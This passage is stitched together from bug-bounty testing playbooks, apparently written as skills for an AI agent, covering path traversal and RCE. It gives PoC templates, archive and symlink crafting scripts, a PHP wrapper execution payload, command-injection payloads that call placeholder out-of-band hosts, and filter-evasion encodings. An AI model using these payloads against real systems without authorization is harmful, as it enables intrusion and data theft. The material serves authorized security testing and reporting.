# general-technique — part 3/45 (85 segment(s))
# content-aware dedupe applied; every unique entry preserved.

## [Bugbountyskills.md] 7. Chain it with

- **`rce-testing`** — LFI→RCE escalation: log/session poisoning execution
  proofs, `php://input`/`data://` payloads, file-upload → web shell once a
  traversal can land content in a parsed location, SSRF where an RFI/fetch sink
  appears (`url=` params route there directly). Upload-handling depth (extension
  matrices, handler remaps) lives in that skill.
- **`info-disclosure-testing`** — sensitive file discovery: finding *which*
  `.env`/`.git`/backup/sourcemap/phpinfo targets exist and exist-beneath which
  root, leaked `nginx.conf`/`php.ini` that confirm V-14/V-15 misconfigs, and
  `session.save_path` from phpinfo that makes V-13 deterministic. Redact every
  secret you find — report the class, don't hoard the material.
- **`xss-testing`** — RPO: relative-URL script masquerading evidence
  (crafted-path fetch + execution in a browser) is XSS-class impact — pair with
  that skill's payloads. Log-served content: poisoned log lines rendered into
  pages, or uploaded HTML/CSV/`Content-Type`-confused files, are stored/reflected
  XSS delivery — route the client-side evidence there.
- Suite neighbors: `bac-idor-testing` (tenant path segments swapped to another
  account — V-04 isolation mapping doubles as broken access control),
  `sandbox-escape-testing` (once file read lands you inside a container/sandbox
  with its own escape class).

## [Bugbountyskills.md] >> path-traversal-testing — variants-1.md (variant playbook)

*Source: `/root/Myskill/path-traversal-testing/references/variants-1.md`*

## [Bugbountyskills.md] Table of contents

- [V-01: Internal file resource inclusion via local file inclusion (LFI) filter breaks](#v-01-internal-file-resource-inclusion-via-local-file-inclusion-lfi-filter-breaks)
- [V-02: External script execution traversal via remote file inclusion (RFI) wrapper pipelines](#v-02-external-script-execution-traversal-via-remote-file-inclusion-rfi-wrapper-pipelines)
- [V-03: Directory separation invalidation via path traversal strings (../)](#v-03-directory-separation-invalidation-via-path-traversal-strings)
- [V-04: Core system profile access bypass (/etc/passwd or Windows/win.ini isolation mapping)](#v-04-core-system-profile-access-bypass-etchpasswd-or-windowswinini-isolation-mapping)
- [V-05: String parsing termination via null byte character injection (%00)](#v-05-string-parsing-termination-via-null-byte-character-injection-00)
- [V-06: Directory matching evasion via double URL encoding string sequences (%252e%252e%252f)](#v-06-directory-matching-evasion-via-double-url-encoding-string-sequences-252e252e252f)
- [V-07: Relative path overwrite (RPO) context confusions for script masquerading](#v-07-relative-path-overwrite-rpo-context-confusions-for-script-masquerading)
- [V-08: LFI to RCE mutation via log file stalking (Apache/Nginx/SSH log injection)](#v-08-lfi-to-rce-mutation-via-log-file-stalking-apachenginxssh-log-injection)

## [Bugbountyskills.md] V-05: String parsing termination via null byte character injection (%00)

**Mechanism:** Input crosses into a layer that treats strings as C-style
null-terminated: bytes after `%00` are discarded at the native boundary while
the application's string-level check validated the *whole* string, including a
decoy suffix (`file.php%00.png` — the app checks `.png`, the OS opens
`file.php`). The violated assumption is "the string the filter saw is the
string the OS opened". This is a legacy-runtime bug: PHP < 5.3.4, old C/C++
components, ancient app servers — not a modern-stack technique.

**Preconditions:**
- Legacy runtime or native component without length-aware path handling
- A suffix-dependent check to defeat: extension allowlist, forced `.png`
  append, signature/`..` filter that validates the tail
- The NUL survives transport (some frameworks reject `%00` outright — that
  rejection itself is signal)

**Detect:**
1. Find suffix-dependent sinks: extension allowlists, forced suffix appends,
   "image only" validators on download/preview params.
2. Baseline: `file=allowed.png` → allowed; `file=target.php` → blocked.
3. Probe matrix (one round, payloads.md §1 row 8): `file=<TARGET>%00.png`,
   `file=<TARGET>%00`, raw `\0` byte in a multipart body, `%2500` (only fires
   if a second decode exists), `..%00/`.
4. Read the differential: blocked → allowed *only* when NUL is present.
   Stronger evidence: an error message naming the **truncated** path (shows the
   native boundary fired).
5. Honesty rule: if the plain payload already works, there is no NUL
   dependency — that's V-01 (filter absent), not V-05. If one round of NUL
   probes changes nothing, record "stack is not NUL-truncating" and move on;
   don't build a report on a dead technique.
6. Windows-adjacent extras on IIS-era stacks: trailing dot/space (`file.php%00...`
   plus `file.php.` / `file.php%20`), NTFS ADS `::$DATA` — each is a separate
   legacy probe, never an assumption.

**Proof of concept:**
```
GET /render?img=cat.png → allowed
GET /render?img=secret.php%00.png → truncation → opens secret.php
GET /upload multipart: filename="shell.php%00.jpg"    # legacy upload bypass
```

**Confirm:** Content returned *only* when the NUL is present, **plus**
truncation evidence (error naming the shortened path, or a second file
uniquely reachable via the NUL variant). Reproducible twice.

**False positives:** WAF/proxy stripping `%00`, which silently makes the plain
payload work — you'd mis-attribute success (test plain payload *with and
without* the filter suspected). A filter that was never checking extensions at
all (V-01). Frameworks echoing `%00`-containing input in errors (reflection).
Scanner boilerplate claiming "null byte RCE" on modern stacks — verify runtime
age from headers/leaks before believing it.

**Impact:** Extension-check bypass → LFI of executable files / upload of
executable content → RCE class. Phrase as "legacy null-byte truncation defeats
`<check>` on `<runtime/version>`; escalate via include sink", with version
evidence — severity depends on what the bypass unlocks.

**Remediation:** Reject NUL and control characters during a pre-validation
canonicalization step before any path operation; use length-aware/binary-safe
file APIs; enforce extension/path allowlists on the final canonical path, not
on raw input.

**CWE / OWASP:** CWE-158 (Improper Neutralization of Null Byte) / CWE-170
(Improper Null Termination); OWASP A03:2021 Injection (A01 where it enables
path escape).

## [Bugbountyskills.md] V-06: Directory matching evasion via double URL encoding string sequences (%252e%252e%252f)

**Mechanism:** The value passes through at least two decode stages (edge proxy
→ WAF → framework auto-decode → app `urldecode`), or the filter decodes once
before checking while the sink decodes again. `%252e%252e%252f` decodes to the
inert literal `%2e%2e%2f` at the check, then to `../` only at the later decode.
The violated assumption is "what we validated is what the sink used" — true
only when decode count and check position line up.

**Preconditions:**
- ≥2 decoding layers, or check-before-decode ordering (very common in
  PHP: `$_GET` auto-decoded once, app calls `urldecode()`/`rawurldecode()`
  again)
- A filter that checks for `../` / `%2e%2e` at one specific encoding level
- Optionally a WAF in front whose decode depth differs from the app's

**Detect:**
1. Encoding matrix against a canary target (payloads.md §1): plain `../`,
   single `%2e%2e%2f`, double `%252e%252e%252f`, triple `%25252e…`, mixed
   `..%2f`, `%2e../`, `.%2e/`.
2. Record per variant: **blocked** (WAF 403/challenge), **accepted-no-effect**
   (200, no content), **content returned**. The finding signature is *plain
   blocked or inert + double-encoded returns canary content*.
3. Count decode passes from reflection: submit `%25252f` and inspect how many
   `%` levels come back echoed — each remaining level tells you a decoder *didn't*
   fire, and the differences pin which layer (WAF vs app) decodes how deep.
4. Cheaper discriminators first: if `..%2f` alone works while plain `../` is
   blocked, one decode layer is doing the work (report as single-encode bypass).
   Escalate to double/triple only when single fails.
5. Legacy one-probe checks: `%c0%ae` overlong UTF-8 and `%u002e` — expected to
   fail on modern stacks; record, never assume (V-12 covers the WAF-evasion
   framing).
6. Test non-query vectors where decode layers differ: multipart filename, JSON
   string values, `X-Original-URL`/`X-Rewrite-URL`, cookies, path segments —
   some layers decode only certain containers.
7. If a WAF is blocking, capture its block-page signature: you are claiming a
   *bypass*, so the WAF's presence must be evidenced too.

**Proof of concept:**
```
GET /download?file=<PLACEHOLDER_ENCODED> HTTP/1.1

plain:    ../../../../<PLACEHOLDER_CANARY_PATH>          → blocked / no content
single:   %2e%2e%2f%2e%2e%2f%2e%2e%2f<CANARY>            → blocked / no content
double:   %252e%252e%252f%252e%252e%252f<CANARY>          → CANARY CONTENT
triple:   %25252e%25252e%25252f%25252e%25252e%25252f<CANARY>
```

**Confirm:** The differential (encoded succeeds where plain fails) reproduces
twice, **plus** canary content or a path/oracle signal — two channels, one of
which is the block-vs-success contrast itself. Log which layer blocked the
plain variant (block-page signature).

**False positives:** No WAF and plain also works → that's V-03, not a bypass
(check your baseline!). Challenge pages reflecting the payload (decode and
compare — echo ≠ read). Double-encoded variant returning 200 with SPA fallback
HTML (check body). Misattributing the decode layer (test with/without the edge
proxy if the program exposes both). Cached 200 from an earlier plain probe.

**Impact:** Traversal behind a filter/WAF/double-decode → arbitrary read class
same as V-03, plus a WAF-bypass claim worth its own evidence. Phrase as
"double-URL-encoding bypass of `<filter/WAF name>` yields arbitrary file read;
decode-once-at-check ordering confirmed by differential".

**Remediation:** Decode exactly once at ingress, canonicalize, validate, and
pass that *same canonical string* to the sink; WAFs must inspect post-
normalization bytes; never decode again after validation.

**CWE / OWASP:** CWE-22 (Path Traversal) + CWE-178 (Improper Handling of
Case/Encoding Differences); OWASP A01:2021 (A05 where the WAF is the relied-
upon control).

## [Bugbountyskills.md] V-07: Relative path overwrite (RPO) context confusions for script masquerading

**Mechanism:** Pages reference assets with *relative* URLs (`src="js/app.js"`,
CSS `url(...)`), and browsers resolve them against the **current document's
URL path** — a path the attacker can deepen via user-content routes, pathinfo
suffixes, or an echoing 404 page. A relative reference on
`/app/view/../../uploads/evil/page` resolves *inside attacker-writable space on
the same origin*, so the browser fetches the attacker's file as if it were the
app's own script: script masquerading → same-origin JS execution without any
HTML injection. The violated assumption is "this relative URL always denotes
our asset".

**Preconditions:**
- Relative asset references (no leading `/`, no protocol, no `<base>` pinning)
- Attacker-influenced document path: user profile/content URLs, uploaded files
  under known paths, `/index.php/<anything>` pathinfo, custom 404/redirect
  pages that render HTML with relative refs
- A same-origin location the attacker can write to (upload with controllable
  filename/name-match, profile field rendered verbatim, stored doc)
- Victim interaction: the victim must open the crafted URL (this is
  XSS-class impact — coordinate evidence with `xss-testing`)

**Detect:**
1. Grep responses for relative references: HTML `src=`/`href=` without a
   leading `/` or scheme, CSS `url()`/`@import` relative, JS runtime loads.
   Record any `<base>` tag first — it re-pins resolution and kills classic RPO.
2. Map path influence: which routes accept attacker-chosen depth? Test
   `/user/<name>/`, upload URLs, `/index.php/..%2f..%2fpage`, and the 404
   handler (an HTML 404 echoing the path with relative refs is prime material).
3. Simulate resolution: request a deep crafted URL, compute what the browser
   *would* resolve for each relative ref (manual URL join, or headless browser
   in your lab), and check whether the target now lands in attacker-writable
   space.
4. Plant: upload/write a file whose name matches the masqueraded asset
   (`app.js`) containing a benign marker — `console.log('RPO-<TOKEN>')` in
   production-safe probes, `alert(document.domain)` only in lab.
5. Re-request the crafted URL and check: (a) server access logs / your HTTP
   server logs show the fetch of your file under the app's asset name from the
   origin, and (b) in a browser session (yours — authorized), the marker runs.
6. CSS variant: masquerade a stylesheet instead of a script — lower severity
   (data exfil / defacement) but real; note it and route the XSS-flavored
   evidence to `xss-testing`.

**Proof of concept:**
```
crafted doc:  <TARGET>/app/<PLACEHOLDER_USER_PATH>/..%2f..%2f<PLACEHOLDER_UPLOAD_DIR>/
   or         <TARGET>/index.php/..%2f..%2f<PLACEHOLDER_UPLOAD_DIR>/
app markup:   <script src="js/app.js">          ← relative, resolves off the crafted path
plant:        upload <PLACEHOLDER_UPLOAD_DIR>/js/app.js  body: console.log('RPO-<TOKEN>')
victim:       open crafted URL → same-origin fetch of planted file as js/app.js
```

**Confirm:** Two signals: (a) the planted file is fetched under the app's own
asset URL from the same origin (server/your access log line), and (b) the
marker executes in a browser session on the crafted URL. Both must reproduce;
(a) without (b) means content-type/CSP blocked execution — report as partial.

**False positives:** Absolute asset paths (leading `/`) — resolution never
moves, not RPO. A `<base href>` pinning resolution. Assets on a different
origin/CDN — no same-origin execution. SPA fallback returning `index.html`
(HTML served where JS was requested is *not* executed as script —
content-type matters). Your upload being fetched at its normal URL rather than
via the crafted path (check the *requested* path in logs). CSP blocking the
script (request-level confusion still stands; execution doesn't — say which).
Browser extensions/hydration fetching assets on their own.

**Impact:** Same-origin script execution via path confusion → session/token
theft and actions as the victim, requiring only a crafted-URL visit. Phrase as
"relative-URL path confusion lets attacker-writable content execute as
`<app asset>` on `<origin>`; victim interaction: visit crafted URL". Chain the
XSS-class evidence with `xss-testing`.

**Remediation:** Emit root-relative or absolute asset URLs (or pin `<base>`),
serve user-generated content on a separate origin with strict CSP, and
normalize/reject `..` segments in routed paths before rendering HTML.

**CWE / OWASP:** CWE-22 (Path Traversal) + CWE-79 (XSS via script
masquerading); OWASP A01:2021 + A03:2021.

## [Bugbountyskills.md] >> path-traversal-testing — variants-2.md (variant playbook)

*Source: `/root/Myskill/path-traversal-testing/references/variants-2.md`*

## [Bugbountyskills.md] Table of contents

- [V-09: LFI to RCE via PHP wrappers execution flow (php://filter, php://input, data://)](#v-09-lfi-to-rce-via-php-wrappers-execution-flow-phpfilter-phpinput-data)
- [V-10: Path traversal via nested archive unpacking flaws (Zip Slip)](#v-10-path-traversal-via-nested-archive-unpacking-flaws-zip-slip)
- [V-11: Local file access via symbolic link (symlink) file upload invalidation](#v-11-local-file-access-via-symbolic-link-symlink-file-upload-invalidation)
- [V-12: WAF bypass path traversal via Unicode/UTF-8 alternate slash character mappings](#v-12-waf-bypass-path-traversal-via-unicodeutf-8-alternate-slash-character-mappings)
- [V-13: LFI resource hijacking via PHP session file poisoning (/var/lib/php/sessions/)](#v-13-lfi-resource-hijacking-via-php-session-file-poisoning-varlibphpsessions)
- [V-14: Path traversal via Nginx alias misconfiguration string splitting](#v-14-path-traversal-via-nginx-alias-misconfiguration-string-splitting)
- [V-15: Arbitrary root configuration file read via static asset mapping misconfigurations](#v-15-arbitrary-root-configuration-file-read-via-static-asset-mapping-misconfigurations)

## [Bugbountyskills.md] lab only (execution):

POST /download?file=php://input
<?php echo 'WRAPPER-OK'; ?>
```

**Confirm:** The base64 round-trip yields *exactly* the expected canary bytes
(reflection cannot fake a correct round-trip of a file you didn't send) **plus**
a second, independent channel — a plain read of a different canary or a
distinct wrapper error taxonomy — reproducing on re-send.

**False positives:** App base64-encoding *your input* and echoing it (then the
decoded content is your string, not the file — always decode and compare). WAF
page echoing the wrapper string verbatim. `resource=` value reflected as text
in HTML. Garbage after decode (the app mangled output — that's a negative, not
a finding). Wrapper-looking strings in a *client-side* fetch (no server
processing).

**Impact:** Arbitrary file read including application source (defeats "we don't
serve .php source"), config/secret classes, and — where `allow_url_include`
holds — LFI→RCE (feasibility argued from production, proven in lab). Phrase as
"PHP wrapper chain yields arbitrary file read; RCE escalation path exists via
`<wrapper>` (lab-proven)".

**Remediation:** Reject `://` and wrapper keywords in path inputs, allowlist a
single scheme (`file`) if any scheme is needed; disable unused wrappers in
php.ini (`allow_url_include=Off`, remove `expect`), and apply V-01/V-03
canonical-path validation to the `resource=` part too.

**CWE / OWASP:** CWE-22 (Path Traversal) / CWE-98 (File Inclusion); OWASP
A01:2021 + A03:2021.

## [Bugbountyskills.md] craft (template):

python3 - <<'EOF'
import zipfile
z = zipfile.ZipFile('<PLACEHOLDER_ARCHIVE>.zip','w')
z.writestr('<PLACEHOLDER_DOTSEGS><PLACEHOLDER_CANARY_PATH>', '<PLACEHOLDER_CANARY_CONTENT>')
z.writestr('inner.zip', <NESTED_ARCHIVE_BYTES>)      # nested variant
z.close()
EOF

POST /api/import  multipart: file=@<PLACEHOLDER_ARCHIVE>.zip
→ then retrieve canary via independent channel
```

**Confirm:** The canary is retrievable from a channel *outside* the extractor's
success message (served URL / LFI / second feature) **plus** path evidence —
either a leaked resolved destination or the same canary reachable only at the
escaped path while the in-root path 404s. Reproduce with a second entry name.

**False positives:** Extraction sanitizing entry names but reporting success
(200 ≠ slip — the retrieval step is decisive). A client-side archive *listing*
endpoint that only parses. Extract-then-delete temp processing with no
persistence (retry and race, or find the retained copy). Archives stored as
blobs, never extracted (check for an extract call in errors/behavior). Canary
"found" at a path the app *also* writes legitimately (choose `tmp/` targets
outside any documented behavior).

**Impact:** Arbitrary file write as the extractor's user → RCE (overwrite app
code, plant web content, config/cron persistence) and cross-tenant writes.
Phrase as "archive entry path traversal → write outside extract root as
`<user>`; canary written to `<path>`; overwrite of executable paths demonstrated
in lab" — per guardrail, production evidence shows the new-file write only.

**Remediation:** After joining, `realpath()` each destination and require a
canonical prefix inside the extract root — reject the entry (not the archive)
if it escapes; strip absolute paths, drive letters, and `..` segments; disable
recursive nested extraction or re-run validation per nesting level; use
safe-extract libraries with slip protection built in.

**CWE / OWASP:** CWE-22 (Path Traversal) / CWE-23; OWASP A08:2021 Software &
Data Integrity Failures + A01:2021; also CWE-434 where the archive carries
executable content.

## [Bugbountyskills.md] V-11: Local file access via symbolic link (symlink) file upload invalidation

**Mechanism:** The app trusts "everything inside the upload directory is user
data", but a symlink *planted inside it* (via a tar/zip symlink entry, a git
sync, or an API) points wherever the attacker chooses. Any later operation that
*follows* links — serving, `include`, hashing, image resize, backup — escapes
the directory: read of `/etc/hostname`-class files, or (write forms) a file
operation redirected onto an existing path. The violated assumption: "an entry
in our directory is a regular file at that location".

**Preconditions:**
- Ability to create a symlink inside the target directory: tar/gz upload with
  link entries, zip symlink attributes (Unix extra fields), git repo with
  `ln -s` content, some CMS "import" APIs
- A later operation that follows symlinks (default for `fopen`/`readfile`/
  `include`/hash/image libs — most do; a few hardened ones use `O_NOFOLLOW`)
- For the read form: an LFI or serve feature reaching `uploads/<your-link>`

**Detect:**
1. Identify link-accepting vectors: tar/gz/zip upload, "sync from git",
   backup/restore import, media library ingestion.
2. Craft a tar containing a symlink to a **canary** first: `link → /etc/hostname`
   (never `/etc/shadow` — guardrail). Template in payloads.md.
3. Trigger the read-side operation: serve `/uploads/<link>`, hash the upload,
   generate a thumbnail, or `include` it via an existing LFI.
4. Differential proof: upload (a) the symlink and (b) a *regular* file with the
   same name containing known content — if the response differs (target bytes
   vs your bytes), the server follows links. Compare sizes/hashes as the
   second channel.
5. Map what follows: image resizer opening the path (read!), `file_get_contents`
   on stored path, backup jobs archiving the directory (link targets get
   *copied* — data exfil vector), `unlink`/move operations (destructive — do
   NOT probe delete forms in production; report capability only).
6. If extraction of archives is the vector rather than a later read, you are
   halfway into V-10 — combine: slip/symlink write + read loop.

**Proof of concept:**
```

## [Bugbountyskills.md] craft (template):

mkdir -p stage && ln -s /etc/hostname stage/canary
tar -czhf <PLACEHOLDER_UPLOAD>.tar.gz -C stage canary

POST /api/upload  multipart: file=@<PLACEHOLDER_UPLOAD>.tar.gz
GET  /uploads/canary        → /etc/hostname bytes        # follow = finding
control: regular file same name → your own bytes          # differential
```

**Confirm:** Canary content returned **through the link** *plus* the control
differential (same-name regular file returns your bytes) — the contrast proves
the server follows links rather than serving your upload. Reproduce twice.

**False positives:** Archives stored as blobs without extraction (no follow
possible — check server behavior first). A tar *listing* endpoint showing link
targets (metadata only — target string in a listing ≠ content read). Image
resizers that reject non-image content with a distinct error (that's a block,
not a follow). Following the link **locally** in your own tooling and mistaking
it for server-side — the hash differential is exactly what rules this out.
Entitled reads of your own files (prove escape with a system canary).

**Impact:** Read outside the upload directory as the service account — source,
config, secrets; combined with write-shaped link operations, redirection of
destructive writes (report as capability; demonstrate only in lab). Phrase as
"symlink following on uploaded archives → arbitrary file read as `<user>`;
canary `<path>` served via `uploads/<link>`".

**Remediation:** Open uploaded paths with `O_NOFOLLOW` (or `lstat()` first and
reject anything not `S_ISREG`), reject archives containing link/hardlink/absolute
entries during extraction, and keep the upload directory on a filesystem where
links to outside paths cannot resolve (separate mount / `nosymfollow`-style
constraints).

**CWE / OWASP:** CWE-59 (Improper Link Resolution Before File Access);
OWASP A01:2021 Broken Access Control; WSTG — Symlink Testing.

## [Bugbountyskills.md] 2. Engagement workflow

1. **Recon & endpoint inventory.** Enumerate every endpoint that accepts data
   flowing toward a code or shell sink: anything named `cmd`, `exec`, `ping`,
   `run`, `eval`, `render`, `template`, `convert`, `export`, file-ish params
   (`file`, `path`, `upload`, `document`), formula/query fields, and
   cookies/params carrying serialized blobs. Pull routes from JS bundles,
   OpenAPI/Swagger specs, mobile API dumps, and historical responses. This
   comes first because sink coverage — not payload cleverness — determines
   what you can find at all.
2. **Parameter & sink mapping.** For each candidate, classify the sink: a
   shell string built by concatenation, a code evaluator (`eval`, `assert`,
   `subprocess`), a template render, a deserializer, a file write, a wrapper
   binary invoked with argv, or a config loader. Trace source→sink when you
   have code (leaked source, source maps, stack traces); otherwise infer from
   response behavior. Record existing filters (allowlists, strip lists) —
   they decide which variant and which encoding you need.
3. **Variant selection.** Route the observed signal through the table in §3 and
   read the matching variant section in `references/variants-1.md` or
   `references/variants-2.md`. One signal often maps to several variants (a
   reflected hostname result could be command injection *or* SSTI); test the
   cheapest discriminators first. URL-fetching sinks with no execution path
   belong to `ssrf-testing` — don't conflate.
4. **Safe probe.** Send the lowest-risk discriminating payload from
   `references/payloads.md`: a DNS/HTTP callback to your collaborator, a
   time-based differential, or `{{7*7}}`-style marker arithmetic. No shells,
   no file writes at this stage.
5. **Confirmation test.** Reproduce the effect with a second, independent
   signal: OOB DNS plus reflected output, time delay plus callback, marker
   arithmetic plus a template stack trace. A single signal has plausible
   alternative explanations; two orthogonal signals do not. This is the step
   juniors skip and the reason reports get rejected in triage.
6. **Impact proof.** Demonstrate the minimum real impact: `whoami`/`id`, a
   marker-file read. Stop there. "I ran one benign command" beats "I dumped
   everything and got banned" in both bounty outcomes and report quality.
7. **False-positive filter.** Work through each variant's **False positives**
   section: WAF interstitials that reflect your input, cached 200s, generic
   error handlers that interpolate your string, client-side eval. Rule every
   alternative explanation out before writing anything up.
8. **Report.** Use the template in §5. Redact tokens, credential material,
   and internal hostnames beyond what proves impact. Attach raw
   request/response pairs with your collaborator domain shown as a
   placeholder.

## [Bugbountyskills.md] 3. Variant selection table

| Signal you observed | Likely variant | Reference |
|---|---|---|
| Command output, shell error text, or timing change after injecting `;`, `&&`, `\|`, backticks, `$(...)` | V-01 OS command string injection | `references/variants-1.md` |
| App evaluates expressions; `eval`/`assert`/`Function`-style sinks; formula or query-language fields | V-02 code argument injection | `references/variants-1.md` |
| Cookies/params carry serialized blobs (Java `rO0AB`, PHP `O:`, Python `gASV`, Ruby `BAh7`); `readObject`-style errors | V-03 insecure deserialization | `references/variants-1.md` |
| Upload feature accepts images/archives; weak extension checks; uploads served from web root | V-04 file upload → web shell | `references/variants-1.md` |
| `{{...}}`/`${...}`/`<%= %>` input comes back computed; template errors leak engine names | V-05 SSTI | `references/variants-1.md` |
| Crashes, worker restarts, segfault-ish 500s around image/font/archive/XML processing | V-06 memory corruption / GC triggers | `references/variants-2.md` |
| Input concatenated as a separate argv to a fixed binary (`git`, `tar`, `convert`, `ffmpeg`) | V-07 argument injection | `references/variants-2.md` |
| Debug/config endpoints; uploadable YAML/INI/ENV; framework config or `PHP_VALUE` override | V-08 insecure config loading | `references/variants-2.md` |
| Input stored then consumed later by jobs/scripts; env/hostname headers; weird uploaded filenames | V-09 blind env-var RCE | `references/variants-2.md` |
| `url`/`host`/`ip` param fetches content; callback-only hits; cloud metadata reachable — no execution path | → `ssrf-testing` | sibling skill |

## [Bugbountyskills.md] 4. Verification standard

A confirmed RCE finding requires all of the following; anything less is a
lead and gets reported as a lead:

1. **Reproducible request + response pair.** The exact HTTP request (headers,
   body, auth state) and the server's response, captured at least twice with
   the same result. Paste-ready for triage.
2. **A second, independent signal.** Two orthogonal proof channels: e.g. OOB
   DNS callback *and* reflected output; sleep-scaling *and* callback; SSTI
   arithmetic *and* engine stack trace. One signal can be mimicked by WAFs,
   frontends, and caching layers; two cannot plausibly co-occur by accident.
3. **Minimal-impact impact proof.** One benign command (`whoami`), one marker
   read. Never credential dumps, never data theft, never destructive
   commands — impact phrasing describes what an attacker *could* do; the
   evidence shows only the minimum they did.
4. **False-positive audit documented.** Name the alternative explanations you
    ruled out (client-side eval, cached response, reflection-only, scanner
    noise) in the report's evidence section.

### [Bugbountyskills.md] Title

`<Vuln type> in <parameter/feature> at <endpoint> (V-XX)`

**Severity:** <Critical/High/...> — one-line justification
**Endpoint:** `POST /api/<path>` — parameter `<param>` (<auth state required>)
**Summary:** 2-3 sentences: the sink, the controllable source, the proven effect.

**Steps to reproduce:**
1. <Authenticate as <role> / no auth required>
2. Send: `<redacted raw request with <PLACEHOLDER> for collaborator values>`
3. Observe: <collaborator hit at <timestamp> / 7s delay / `49` reflection / uid>

**Impact:** What an attacker gains (code execution as which user, reachable
paths, secrets class) and the realistic worst case.

**Evidence:** Redacted request/response pairs; collaborator log with your
domain masked; timestamps. Show proof of effect, not payloads that dump data.

**Remediation:** One specific fix for this sink (exec with argv array,
expression parser, template sandbox, serialization replacement, etc.).

**References:** CWE-<XX>; OWASP Top 10 <A0X:2021>; variant V-XX in
rce-testing skill.
```

## [Bugbountyskills.md] 6. Reference pointers

Read `references/variants-1.md` for variants 1-5 and `references/variants-2.md`
for variants 6-9; read `references/payloads.md` when you need request
templates, tool commands, or WAF-evasion encodings.

Each variant section is self-contained: mechanism, preconditions, numbered
detect steps, a proof-of-concept template with `<PLACEHOLDER>` slots, the
independent confirmation signal, false positives, impact phrasing, a
sink-specific remediation, and the CWE/OWASP mapping. Match your observed
signal to §3, open that variant, and work top to bottom.

## [Bugbountyskills.md] 0. Safe-first detection ladder

**Rule: the first signal is always an out-of-band callback to a domain or
collaborator you control. Never pop shells on third-party infrastructure as a
first step.** Climb in this order and stop as soon as you have two
independent signals:

1. **OOB DNS/HTTP callback** — zero impact, proves server-side processing.
   Use a unique path/token per test (`/rce-001`, `<TOKEN>`) so delayed or
   duplicate hits are attributable.
2. **Arithmetic/marker reflection** — `{{7*7}}`-style probes for SSTI/eval.
   Read-only, in-band.
3. **Time differential** — `sleep 3` vs `sleep 7` scaling. Short delays only.
4. **Read-only file/identity read** — `/etc/hostname`, `whoami`, `id`.
   Minimum proof of execution context.
5. **Impact ceiling for production** — one benign command. Stop. Do not dump
   credentials, do not read user data, do not persist.

Collaborator setup (templates):

```bash

## [Bugbountyskills.md] interactsh — OOB DNS + HTTP with full request logging

interactsh-client -v                      # note your <OOB_DOMAIN>

<!-- exact-duplicate entries folded in: 1 -->

## [Bugbountyskills.md] Burp: Collaborator tab → "Copy to file" then poll

<!-- exact-duplicate entries folded in: 1 -->

## [Bugbountyskills.md] Simple HTTP callback logger (if you control a public box)

python3 -m http.server 8000               # logs GETs; pair with a DNS log

## [Bugbountyskills.md] DNS-only probe without HTTP:

nslookup <PLACEHOLDER_OOB_DOMAIN>.<TOKEN> <YOUR_NS>
```

## [Bugbountyskills.md] 1. Command-injection differential templates

Baseline everything: send the benign value first (`host=example.com`), time it,
record the response shape. A finding is a *differential* against this baseline.

| Technique | Template (param value) | Signal | Notes |
|---|---|---|---|
| Terminator + OOB | `example.com;<PLACEHOLDER_OOB_DOMAIN>.<TOKEN>` | DNS/HTTP hit | Also try `\|`, `&&`, `\|\|`, `%0a`, `%0d%0a` separators |
| Subshell + DNS-only OOB | `$(nslookup <PLACEHOLDER_OOB_DOMAIN>.<TOKEN>)` | DNS hit | Prefer DNS-only before HTTP — fewer moving parts |
| Subshell + HTTP OOB | `` `curl http://<PLACEHOLDER_OOB_DOMAIN>/<TOKEN>` `` | HTTP hit | Backtick and `$(...)` variants both worth sending |
| Time-based A | `; sleep 3 #` | ~3s extra | Two values prove control: 3s then 7s must scale |
| Time-based B | `; ping -c 4 127.0.0.1 #` | ~3s extra | Works where `sleep` is missing (busybox images) |
| Windows time | `& ping -n 4 127.0.0.1 &` | ~3s extra | cmd.exe semantics; try `\|` and `%COMSPEC%` too |
| Language time | `'; import time; time.sleep(3); '` | ~3s extra | Python/PHP (`sleep(3)`) evaluator contexts |
| Output-based | `; id #` or `\| id #` | Reflected uid | Only after OOB confirms; one benign command |

Evasion encodings (try when the raw terminator is stripped — see §3 table):

- IFS splitting: `cat${IFS}/etc/hostname`
- Newline/tab separators: `%0a`, `%0d%0a`, `%09` instead of space
- Empty-string concatenation: `ca""t /etc/hostname`
- Brace expansion: `{cat,/etc/hostname}`
- Wildcard: `c?t /etc/hostname`
- Base64 pipe: `echo <B64_CMD> | base64 -d | sh`

Gotcha: `sleep` output vs app latency — noise from the app looks random;
controlled scaling (3s→7s→3s) is proof. Repeat the differential at least twice
before claiming.

## [Bugbountyskills.md] 3. Encoder / obfuscation tricks

| Trick | Example | Bypasses |
|---|---|---|
| `${IFS}` separator | `cat${IFS}/etc/hostname` | Space filters |
| Encoded newline | `;%0acurl <OOB>` | Blocklists on `;` + space |
| Empty-string concat | `ca""t /etc/hostname` | Keyword denylists (`cat`) |
| Brace expansion | `{cat,/etc/hostname}` | Keyword denylists |
| Wildcard | `c?t /etc/hostname` | Keyword denylists |
| Base64 pipe | `echo <B64> \| base64 -d \| sh` | Almost all string filters |
| Double URL-encode | `%253b` | Double-decoding parsers |
| Case mixing (Windows) | `WhOaMi`, `cMd /c whoami` | Case-sensitive blocklists |
| Unicode dashes | `–output` (U+2013) vs `-` | Naive flag filters (rarely works — test, don't assume) |
| Nested Jinja | `{{ attr('\|attr') }}` chains, `__cla''ss__` | WAF dunder-name rules |

Honesty note: overlong UTF-8 and null-byte truncation (`shell.php%00.jpg`)
are dead on modern stacks — test once, don't build a report on them.

## [Bugbountyskills.md] 4. Upload-testing checklist

- [ ] Baseline: upload a valid minimal image with an embedded marker string;
      retrieve it from its storage URL; confirm integrity (re-encode check —
      recompression strips appended payloads, which kills many "findings").
- [ ] Extension matrix: `.php .phtml .php5 .php7 .phar .jsp .jspx .asp .aspx
      .cgi .pl`, double extensions (`shell.jpg.php`), case flips (`.PhP`),
      trailing dot/space (Windows), unicode-normalized chars.
- [ ] Content matrix: correct/wrong `Content-Type`, missing type, magic-byte
      polyglots (`GIF89a` + PHP/JSP polyglot body), zip/tar uploads.
- [ ] Bypass extras: null byte legacy (`x.php%00.jpg` — modern stacks: expect
      failure), `.htaccess` / `web.config` upload (handler remap), SVG (note:
      scripted SVG is stored XSS, not RCE — report accordingly).
- [ ] Storage-path guess: web root? predictable filename? predictable URL?
      Does the server serve uploads from a parsing handler (Apache
      AddHandler, nginx+php-fpm pathinfo)?
- [ ] Execution proof: one benign marker file, one GET, observe interpreter
      output. Then delete it or disclose — no shells left behind (guardrail).
- [ ] Second-order: is the uploaded file later *included* by the app? If yes,
      that is LFI→RCE — chain with `path-traversal-testing`.
- [ ] Zip slip / path traversal in archives → `path-traversal-testing`.

